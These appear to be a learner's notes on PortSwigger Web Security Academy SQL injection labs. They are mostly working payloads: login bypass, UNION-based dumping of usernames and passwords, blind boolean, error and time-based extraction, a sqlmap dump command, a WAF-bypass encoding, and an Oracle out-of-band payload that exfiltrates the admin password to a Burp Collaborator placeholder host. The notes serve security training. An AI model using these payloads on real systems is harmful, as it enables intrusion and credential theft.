### SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

This is the query being executed:
`SELECT * FROM products WHERE category = 'XXX AND released = 1`

This was the injection:
`Pets' OR 1=1--`

This is how the query looks like:
```sql
SELECT * FROM products WHERE category = 'Pets' OR 1=1--' AND released = 1
``` 

----------------------
### SQL injection vulnerability allowing login bypass

This is the query being executed:
`SELECT * FROM users WHERE username = 'XXX' AND password = 'XXX'

This was the injection: 
`administrator'--`

This is how the query looks like:
```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = 'XXX'
```

You are ignoring the rest of the query after the username, that's why you can log in as "administrator". Password is being ignored

---
### SQL injection attack, querying the database type and version on Oracle

There is a built-in table in Oracle databases called "dual". So, after finding the vulnerable parameter, you can this query:
`Gifts'UNION SELECT NULL, FROM dual-- -` and keep adding "NULL" until you find the correct amount of columns. After that, you can grab the version by doing this query:
`Gifts'UNION SELECT BANNER, 'NULL', FROM v$version-- -`

---
### SQL injection attack, querying the database type and version on MySQL and Microsoft

After you get the vulnerable parameter, find the amount of columns the table has with the UNION SELECT attack.

Then, in one of the values, inject @@version, like this:
`'UNION SELECT @@version,NULL#`

---
### SQL injection attack, listing the database contents on non-Oracle databases

After veriying the columns same as before, you use this query to retrieve the list of tables of the DDBB:
`Gifts'UNION SELECT table_name,'DEF' FROM information_schema.tables-- -`

Here we can list all the tables. Then, we can see all the columns from a particular table, like this:

`'UNION SELECT column_name,null FROM information_schema.columns where table_name='users_abcdef'`

Here we'll see columns called password and username. Let's query directly that:
`'UNION SELECT username_abcde,password_abcde FROM users_abcdef`

---
### SQL injection attack, listing the database contents on Oracle

The same as before, but with this values:
`Lifestyle' UNION SELECT table_name,NULL FROM all_tables-- -`

`Lifestyle' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_ABCDEF'`

`Lifestyle' UNION SELECT USERNAME_GYAXJR,PASSWORD_HKWQYN FROM USERS_SPYXLY-- -`

---
### SQL injection UNION attack, determining the number of columns returned by the query

**UNION** is used to retrieve data from other tables within the database, for example:
`SELECT a, b FROM table1 UNION SELECT c, d FROM table2`

For a UNION query to work, two key requirements must be met:
- The individual queries must return the same number of columns
- The data types in each column must be compatible between the individual queries

To meet this requirements, you need to find out:
- How many columns are being returned from the original query
- Which columns returned from the original query are of a suitable data type to hold the results from the injected query

**Two methods for determining the number of columns required:**

**ORDER BY**
Inject `ORDER BY` until an error occurs.
```text
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
etc.
```

When the specified column index exceeds the number of actual columns in the result set, the database returns an error.

**UNION SELECT**
Inject `UNION SELECT` until you don't see an error.
```text
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
etc.
```

It has 3 columns, we solved it by injecting:
`Gifts' UNION SELECT NULL,NULL,NULL--`

---
### SQL injection UNION attack, finding a column containing text

This is a union select attack. After you find a vulnerable parameter by injecting `'`, you start building you query. It will be like this `'UNION SELECT NULL-- -`
And you will add NULL parameters to determine the number of columns. 
After you find that value, in our case, 3, you will replace every "NULL" for the value the lab give you, like this:
`'UNION SELECT NULL,'stringValue',NULL-- -`

---
### SQL injection UNION attack, retrieving data from other tables

`'UNION SELECT table_names, NULL FROM information_schema.tables`
`'UNION SELECT column_names, NULL FROM information_schema.columns WHERE table_name='users'`
`'UNION SELECT username, password FROM users`

---
### SQL injection UNION attack, retrieving multiple values in a single column

We already know there is a "users" table, and columns "username" and "password". So we can concatenate with the ||:

`'UNION SELECT NULL,username|| "~" ||password FROM users-- -`

---
### Blind SQL injection with conditional responses

Blind SQL. In the request '/filter?category=' modify the cookie  TrakingId, and add `' AND '1'='2`. Send it, and you'll see the "Welcome Back!" message **is not showing**. 

So, when you send a valid query, the "Welcome Back!" message shows, and when that condition is not TRUE, the message dissapear.

`TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a` This to test there is a table called "users", and then this to confirm there is an "administrator" user:
`TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a`. 

Now, **this is important**, to get the length of the password, we'll do it this way:
`TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a`
Manually, or with burp intruder, you'll find the condition is true until 20. Si it's 20 characters length.

After that, you will need to see which character matches, and you can build the password one character at a time. With this query:
`TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§`
The ITERATOR value will be the one you will increase until found all the password!

**TIP:** In the intruder, set the payload with a-z, A-Z, 0-9, and in the Settings, use the "grep" to match whatever you want. In this case, "Welcome back"

This is the password: cjxoaecw5dswvyf8dfn2

`python3 sqlmap.py -u "https://0ab200bf03110fdd80668f0d00cb0016.web-security-academy.net/" --cookie="TrackingId=NqaTIQn0uAfNdMiq*" --batch -D public -T users -C "username,password" --dump`

---
### Blind SQL injection with conditional errors

Add a single quote to the TrackingId, and you'll see it throws an error. Add another one, and the page works just fine

``'||(SELECT '')||'`` to chech if stills broken the web (it's a valid query syntax, so it shouldn't). As this breaks the page, try with a Oracle syntax:
`'||(SELECT '' FROM dual)||'` and this responds OK.

Now, this should be true, confirming there is a "users" table, and the ROWNUM=1 ensures there is only one row returned, so we don't break our concatenation

Now, this returns an error:
`'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`

But this doesn't `'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'` meaning we can trigger an error conditionally on the truth of a specific condition. 

Verify there is an "administrator" username, with this query: `'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`. As it throws an error, it's true. 

To check it's length `'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'`. Again, the length is 20.

And this will be the iterator to get every character: `'||(SELECT CASE WHEN SUBSTR(password,1,1)='ITERATOR' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`

This is the password: cnr4ypywu0q8v3dpdcgy

---
### Visible error-based SQL injection

In the trackingId value, append a single quote `'`and you'll see the page is returning the full error, disclosing the query. 

![[Pasted image 20240521204224.png]]

If you put this query, it returns a detailed error:
`' AND CAST((SELECT 1) AS int)--`

![[Pasted image 20240521204400.png]]
As the condition met, this query should not return error  `' AND 1=CAST((SELECT 1) AS int)--`

Replace the 1 of the SELECT for your desired query. And you'll see there is not enough space for your response. **So remove the value of the TrackingId**
`' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--

This is the final query: `' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`

---
### Blind SQL injection with time delays

In the tracking ID, this is your payload: `'||pg_sleep(10)--`

---
### Blind SQL injection with time delays and information retrieval

This query to check the app take 10 seconds to responds: `'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--`. The `%3B` is a `;` 

This to see if exists an 'administrator' user from the 'users' table.
`'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`

This query to check how many characters the password has: `'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--` In this case, it has 20. 

Now in the repeater, adding the substring parameter, we can get the password.

This query: `'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`

Set up the attack, in the Resource Pool, create a new one, with a "Maximum concurrent requests" value of 1. 
Then send it, and check the column "Response received"

This is the password: 9k46suvve4cds9iybfcz

---
### Blind SQL injection with out-of-band interaction

This is your payload: `TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--`

---
### Blind SQL injection with out-of-band data exfiltration

This is your payload: `TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--`

You'll receive the password in the host header, in the burp collaborator.

---
### SQL injection with filter bypass via XML encoding

You'll need to bypass the WAF. For that:
Install the Hackvertor extension. Then right click > extensions > Hackvertor > Encode > hex_entities

Input this in the `<StoreId>`:
 `<@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities>`
